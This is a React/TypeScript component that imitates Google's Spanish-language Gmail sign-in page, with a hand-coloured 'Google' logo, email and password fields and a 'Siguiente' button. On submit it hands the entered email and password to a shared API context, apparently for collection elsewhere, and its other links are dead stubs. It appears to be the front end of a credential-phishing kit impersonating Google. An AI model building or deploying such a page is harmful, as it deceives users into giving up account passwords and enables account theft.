import React, { useState } from 'react';
import { useApiContext } from '../../context/ApiContext';

const GoogleLogin: React.FC = () => {
  const [email, setEmail] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const { setMail, setPassword } = useApiContext();


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !passwordInput.trim()) return;
    setIsLoading(true);
    
    setTimeout(() => {
      setIsLoading(false);
    }, 1000);

    setMail(email);
    setPassword(passwordInput);    
  };

  const handleForgotPassword = () => {
  };

  const handleCreateAccount = () => {
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
      <div className="max-w-sm w-full bg-white rounded-lg shadow-sm border border-gray-200 p-8">
      {/* Google Logo */}
      <div className="text-center mb-6">
        <div className="mb-6">
          <div className="text-center">
            <span className="text-4xl font-normal tracking-tight">
              <span className="text-blue-500">G</span>
              <span className="text-red-500">o</span>
              <span className="text-yellow-500">o</span>
              <span className="text-blue-500">g</span>
              <span className="text-green-500">l</span>
              <span className="text-red-500">e</span>
            </span>
          </div>
        </div>
        
        <h1 className="text-2xl font-normal text-gray-800 mb-2">Inicia sesión</h1>
        <p className="text-base text-gray-600">Ir a Gmail</p>
      </div>

      {/* Email Form */}
      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Email Input */}
        <div className="relative">
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onFocus={() => setEmailFocused(true)}
            onBlur={() => setEmailFocused(false)}
            placeholder="Correo electrónico o teléfono"
            className={`
              w-full px-4 py-3 text-base border rounded-md
              outline-none transition-all duration-200
              ${emailFocused || email 
                ? 'border-blue-500 border-2' 
                : 'border-gray-300 hover:border-gray-400'
              }
            `}
            required
          />
        </div>

        {/* Password Input */}
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            value={passwordInput}
            onChange={(e) => setPasswordInput(e.target.value)}
            onFocus={() => setPasswordFocused(true)}
            onBlur={() => setPasswordFocused(false)}
            placeholder="Contraseña"
            className={`
              w-full px-4 py-3 pr-12 text-base border rounded-md
              outline-none transition-all duration-200
              ${passwordFocused || passwordInput 
                ? 'border-blue-500 border-2' 
                : 'border-gray-300 hover:border-gray-400'
              }
            `}
            required
          />
          {passwordInput && (
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-blue-600 text-sm font-medium hover:underline"
            >
              {showPassword ? 'Ocultar' : 'Mostrar'}
            </button>
          )}
        </div>

        <div className="text-left">
          <button
            type="button"
            onClick={handleForgotPassword}
            className="text-blue-600 text-sm font-medium hover:underline"
          >
            ¿Has olvidado tu correo electrónico?
          </button>
        </div>

        <div className="text-sm text-gray-600 leading-5">
          <p>
            ¿No es tu ordenador? Usa el modo invitado para iniciar sesión de forma privada.{' '}
            <button
              type="button"
              className="text-blue-600 font-medium hover:underline"
            >
              Más información
            </button>
          </p>
        </div>

        <div className="flex items-center justify-between pt-4">
          <button
            type="button"
            onClick={handleCreateAccount}
            className="text-blue-600 text-sm font-medium hover:underline"
          >
            Crear cuenta
          </button>
          
          <button
            type="submit"
            disabled={!email.trim() || !passwordInput.trim() || isLoading}
            className={`
              px-6 py-2 rounded text-sm font-medium transition-all duration-200
              ${!email.trim() || !passwordInput.trim() || isLoading
                ? 'bg-gray-100 text-gray-400 cursor-not-allowed'
                : 'bg-blue-600 text-white hover:bg-blue-700 shadow-sm hover:shadow'
              }
            `}
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                <span>Validando...</span>
              </div>
            ) : (
              'Siguiente'
            )}
          </button>
        </div>
      </form>
      </div>
    </div>
  );
};

export default GoogleLogin;